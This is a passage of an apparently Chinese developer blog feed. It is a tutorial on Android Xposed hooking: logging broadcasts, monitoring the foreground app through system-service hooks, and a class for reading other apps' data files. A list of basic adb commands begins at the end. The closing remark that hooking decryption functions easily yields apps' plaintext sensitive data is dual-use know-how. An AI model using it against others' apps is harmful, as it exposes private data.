receivingUid);</span><br><span class="line"></span><br><span class="line">                Intent intent = (Intent) param.args[<span class="number">0</span>];</span><br><span class="line">                String action = intent.getAction();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (action == <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">if</span> (action.equals(<span class="string">"android.intent.action.SCREEN_OFF"</span>))</span><br><span class="line">                    XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"screen off"</span>);</span><br><span class="line">                <span class="keyword">if</span> (action.equals(<span class="string">"android.intent.action.SCREEN_ON"</span>))</span><br><span class="line">                    XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"screen on"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p>打印锁屏和亮屏的广播事件，结果如下所示：<br>过滤日志<code>adb logcat | grep checkBroadcast</code></p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-usage-1.jpg" alt="checkBroadcast"></p>
<h2 id="嵌套hook监控前台应用">嵌套hook监控前台应用</h2><p>&#160;&#160;&#160;&#160;在编写代码时候，要实现实时监控前台应用是相当棘手的一件事情，并且在5.11以后的版本获取所有运行app都已经受到限制，stackoverflow中给出了一种方法，<a href="http://stackoverflow.com/questions/30619349/android-5-1-1-and-above-getrunningappprocesses-returns-my-application-packag" target="_blank" rel="external">Get Running Apps on M with no permissions &amp; get the foreground app on Android 5.1.1+</a>，测试了获取前台应用的代码相当耗性能。这里基于xposed框架给出另外一种方法。</p>
<p>同样通过阅读源代码中的<a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/com/android/server/net/NetworkPolicyManagerService.java" target="_blank" rel="external">NetworkPolicyManagerService</a>这个类，找到回调函数<code>onForegroundActivitiesChanged</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> IProcessObserver mProcessObserver = <span class="keyword">new</span> IProcessObserver.Stub() &#123;</span><br><span class="line"></span><br><span class="line">	<span class="annotation">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onForegroundActivitiesChanged</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> uid, <span class="keyword">boolean</span> foregroundActivities)</span> </span>&#123;</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">  	<span class="annotation">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProcessStateChanged</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> uid, <span class="keyword">int</span> procState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">synchronized</span> (mRulesLock) &#123;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ActivityManager服务中IProcessObserver有个回调函数onForegroundActivitiesChanged。而动态设置网络连接规则的时候，NetworkPolicyManagerService服务通过检测系统发出的一些相关事件（在NetworkPolicyManagerService的启动systemReady函数中注册），其中会调用ActivityManager服务中IProcessObserver的onForegroundActivitiesChanged及onProcessDied回调事件，因此，我们通过hook服务类NetworkPolicyManagerService中的onForegroundActivitiesChanged回调函数来监控前台应用，但是这个过程必须保证在systemReady函数已启动注册了该服务，因此需要嵌套hook。具体过程如下：</p>
<blockquote>
<ol>
<li>hook systemReady函数</li>
<li>通过<code>param.thisObject</code>获取hook方法所在类的实例，<br>即<code>NetworkPolicyManagerService.class</code></li>
<li>通过<code>getObjectField</code>获取类中的对象<code>mProcessObserver</code></li>
<li>hook对象<code>mProcessObserver</code>中的<code>onForegroundActivitiesChanged</code>方法</li>
</ol>
</blockquote>
<p>完整代码如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">hook_method(<span class="string">"com.android.server.net.NetworkPolicyManagerService"</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">"systemReady"</span>,</span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady"</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady : "</span> + param.thisObject.getClass());</span><br><span class="line"></span><br><span class="line">                Object mProcessObserverClass = XposedHelpers.getObjectField(param.thisObject, <span class="string">"mProcessObserver"</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady : "</span> + mProcessObserverClass.getClass());</span><br><span class="line"></span><br><span class="line">                hook_method(mProcessObserverClass.getClass(),</span><br><span class="line">                        <span class="string">"onForegroundActivitiesChanged"</span>,</span><br><span class="line">                        <span class="keyword">int</span>.class,  <span class="comment">// pid</span></span><br><span class="line">                        <span class="keyword">int</span>.class,  <span class="comment">// uid</span></span><br><span class="line">                        <span class="keyword">boolean</span>.class, <span class="comment">// foregroundActivities</span></span><br><span class="line">                        <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                    <span class="annotation">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> ((<span class="keyword">boolean</span>) param.args[<span class="number">2</span>])</span><br><span class="line">                            XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.onForegroundActivitiesChanged : foreground uid = "</span> + param.args[<span class="number">1</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p>打印前台应用，结果如下所示：<br>过滤日志<code>adb logcat | grep onForegroundActivitiesChanged</code></p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-usage-2.jpg" alt="onForegroundActivitiesChanged"></p>
<h2 id="xposed进程读取文件">xposed进程读取文件</h2><p>&#160;&#160;&#160;&#160;有时候需要xposed进程根据我们自身进程的设置来执行不同的逻辑功能，因此需要xposed进程读取我们进程的配置文件。xposed框架中提供了读取<code>data/data/package name/shared_prefs</code>目录下的xml配置文件功能类<code>XSharedPreferences</code>，该类继承了系统类<code>SharedPreferences</code>并提供类额外的<code>reload</code>方法，当我们配置文件更新后，可以调用该方法重新加载。</p>
<p>&#160;&#160;&#160;&#160;需要注意的是，该类只支持读操作，如果你尝试去执行写操作会抛异常。至于为什么作者没有添加写权限，作者也给出了详细的解释，详见：<a href="https://github.com/rovo89/XposedBridge/issues/63" target="_blank" rel="external">Cannot Write into a Shared Preferences File</a></p>
<p>&#160;&#160;&#160;&#160;我在使用的过程中，需要读取files目录下的json文件内容，使用时发现该类只能读取xml文件，作为jar导入包又不适合修改，因此仿照XSharedPreferences写了一个可以读取任何文件内容的<code>XFile</code>类，其实可以逐渐完善读更多文件类型的内容，包括数据库等。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.idhyt.xposedExtend;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Environment;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.json.JSONException;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.SELinuxHelper;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.services.FileResult;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> *</span><br><span class="line"> * Created by idhyt on 2015/12/10.</span><br><span class="line"> *</span><br><span class="line"> * This class is used to read file from data/data/xxx/files directory,</span><br><span class="line"> * same as XSharedPreferences, read-only and without listeners support.</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XFiles</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"XFiles"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> File mFile;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String mFilename;</span><br><span class="line">    <span class="keyword">private</span> ByteArrayOutputStream mFileOutputStream;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> mLoaded = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> mLastModified;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> mFileSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Read settings from the specified file.</span><br><span class="line">     * <span class="doctag">@param</span> file The file to read.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(File file)</span> </span>&#123;</span><br><span class="line">        mFile = file;</span><br><span class="line">        mFilename = mFile.getAbsolutePath();</span><br><span class="line">        startLoadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> packageName The package name.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(String packageName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(packageName, packageName + <span class="string">"_files"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> packageName The package name.</span><br><span class="line">     * <span class="doctag">@param</span> fileName The file name with suffix (.txt, .json, etc..)</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(String packageName, String fileName)</span> </span>&#123;</span><br><span class="line">        mFile = <span class="keyword">new</span> File(Environment.getDataDirectory(), <span class="string">"data/"</span> + packageName + <span class="string">"/files/"</span> + fileName);</span><br><span class="line">        mFilename = mFile.getAbsolutePath();</span><br><span class="line">        startLoadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Tries to make the files file world-readable.</span><br><span class="line">     *</span><br><span class="line">     * This will only work if executed as root (e.g. &#123;<span class="doctag">@code</span> initZygote()&#125;) and only if SELinux is disabled.</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; in case the file could be made world-readable.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">makeWorldReadable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!SELinuxHelper.getAppDataFileService().hasDirectFileAccess())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; <span class="comment">// It doesn't make much sense to make the file readable if we wouldn't be able to access it anyway.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mFile.exists()) <span class="comment">// Just in case - the file should never be created if it doesn't exist.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mFile.setReadable(<span class="keyword">true</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Returns the file that is backing these preferences.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; The file might not be accessible directly.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> File <span class="title">getFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startLoadFromDisk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            mLoaded = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="string">"XFiles-load"</span>) &#123;</span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (XFiles.<span class="keyword">this</span>) &#123;</span><br><span class="line">                    loadFromDiskLocked();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@SuppressWarnings</span>(&#123; <span class="string">"rawtypes"</span>, <span class="string">"unchecked"</span> &#125;)</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loadFromDiskLocked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mLoaded) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        FileResult fileResult = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fileResult = SELinuxHelper.getAppDataFileService().getFileInputStream(mFilename, mFileSize, mLastModified);</span><br><span class="line">            InputStream inputStream = fileResult.stream;</span><br><span class="line">            <span class="keyword">if</span> (inputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> length = inputStream.available();</span><br><span class="line">                <span class="keyword">byte</span> [] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> readLength;</span><br><span class="line">                <span class="keyword">while</span> ((readLength = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    byteArrayOutputStream.write(buffer, <span class="number">0</span>, readLength);</span><br><span class="line">                &#125;</span><br><span class="line">                fileOutputStream = byteArrayOutputStream;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException ignored) &#123;</span><br><span class="line">            <span class="comment">// SharedPreferencesImpl has a canRead() check, so it doesn't log anything in case the file doesn't exist</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">"getSharedPreferences"</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (fileResult != <span class="keyword">null</span> &amp;&amp; fileResult.stream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fileResult.stream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException rethrown) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> rethrown;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mLoaded = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (fileOutputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">            mFileOutputStream = fileOutputStream;</span><br><span class="line">            mLastModified = fileResult.mtime;</span><br><span class="line">            mFileSize = fileResult.size;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mFileOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        &#125;</span><br><span class="line">        notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Reload the settings from file if they have changed.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; With enforcing SELinux, this call might be quite expensive.</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@return</span> true if execute reload;</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">reload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hasFileChanged()) &#123;</span><br><span class="line">            startLoadFromDisk();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Check whether the file has changed since the last time it has been loaded.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; With enforcing SELinux, this call might be quite expensive.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">hasFileChanged</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileResult result = SELinuxHelper.getAppDataFileService().statFile(mFilename);</span><br><span class="line">            <span class="keyword">return</span> mLastModified != result.mtime || mFileSize != result.size;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException ignored) &#123;</span><br><span class="line">            <span class="comment">// SharedPreferencesImpl doesn't log anything in case the file doesn't exist</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">"hasFileChanged"</span>, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">awaitLoadedLocked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!mLoaded) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException unused) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFileContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            awaitLoadedLocked();</span><br><span class="line">            <span class="keyword">return</span> mFileOutputStream.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> JSONObject <span class="title">getJsonFileContent</span><span class="params">()</span> <span class="keyword">throws</span> JSONException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JSONObject(getFileContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="判断xposed框架是否生效">判断xposed框架是否生效</h2><p>&#160;&#160;&#160;&#160;正如上边所说，xposed框架中对文件只有读权限，因此获取信息就变成了单项了，xposed进程只能根据我们的配置文件进行相应的逻辑操作。由于应用进程和xposed进程是不同的进程，如果应用进程要判断xposed框架是否启用，就需要进程间数据通信，如果仅仅只是判断xposed是否启动而去启动一个服务处理数据，感觉有点小题大做了。这里给出一种简单有效的方法。</p>
<blockquote>
<p>1.首先我们生成一个配置文件<code>setting.xml</code><br>2.定义一个函数</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setXposedStatus</span><span class="params">(<span class="keyword">boolean</span> bStatus)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.getSharedPreferences(<span class="string">"setting"</span>, Context.MODE_WORLD_READABLE).edit().putBoolean(<span class="string">"xposed_enabled"</span>, bStatus).apply();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>3.应用每次启动时候调用函数<code>setXposedStatus</code><br>4.在xposed中hook函数<code>setXposedStatus</code>调用前，并将参数改为<code>true</code></p>
</blockquote>
<p>这样我们要想知道xposed框架是否生效可用，读取<code>setting.xml</code>中<code>xposed_enabled</code>字段值即可。</p>
<h2 id="总结">总结</h2><p>&#160;&#160;&#160;&#160;xposed框架不仅能够hook任意你想hook的函数，并且自身也有一个很大的特点，就是一旦用户安装并启用，你所有的操作都不需要任何权限就可实现。基于xposed框架的优秀应用也特别多，比如著名的省电应用<code>绿色守护</code>。再如有一些app对敏感数据进行加密，加密算法又很复杂，那么通过hook解密函数就可以轻松的拿到明文。xposed框架的奇妙之处远远不仅于此，国外也有人对其进行二次封装作出了更神奇的用法，例如<a href="https://github.com/seebye/XClasses" target="_blank" rel="external">XClasses</a>，如果你有什么奇淫技巧，我只想对你说四个字，请带上我！</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160;&#160;&#160;&#160;之前<a href="http://blog.idhyt.com/2015/09/25/4-android-injection-xposed/">安卓注入框架Xposed分析与简单应用</a>只是简单的了解了一下xposed框]]>
    </summary>
    
      <category term="xposed" scheme="http://blog.idhyt.com/tags/xposed/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[adb shell常用命令]]></title>
    <link href="http://blog.idhyt.com/2015/10/31/android-adb-shell-command/"/>
    <id>http://blog.idhyt.com/2015/10/31/android-adb-shell-command/</id>
    <published>2015-10-31T03:45:11.000Z</published>
    <updated>2016-05-09T13:54:03.000Z</updated>
    <content type="html"><![CDATA[<ul>
<li><p>获取编译时间<br><code>cat /proc/version</code></p>
</li>
<li><p>内核崩溃<br><code>cat /proc/last_kmsg</code></p>
</li>
<li><p>获取硬件信息<br><code>adb shell getprop | grep cpu</code></p>
</li>
<li><p>获取序列号：<br><code>adb get-serialno</code></p>
</li>
<li><p>查看连接计算机的设备：<br><code>adb devices</code></p>
</li>
<li><p>查看模拟器/设施的当前状态:<br><code>adb get-state</code></p>
</li>
<li><p>多设备下连接目标设备：<br><code>adb -s xxx shell</code></p>
</li>
<li><p>重启机器：<br><code>adb reboot</code></p>
</li>
<li><p>重启到bootloader，即刷机模式：<br><code>adb reboot bootloader</code></p>
</li>
<li><p>重启到recovery，即恢复模式：<br><code>adb reboot recovery</code></p>
</li>
<li><p>查看log：<br><code>adb logcat</code></p>
</li>
<li><p>终止adb服务进程：<br><code>adb kill-server</code></p>
</li>
<li><p>重启adb服务进程：<br><code>adb start-server</code></p>
</li>
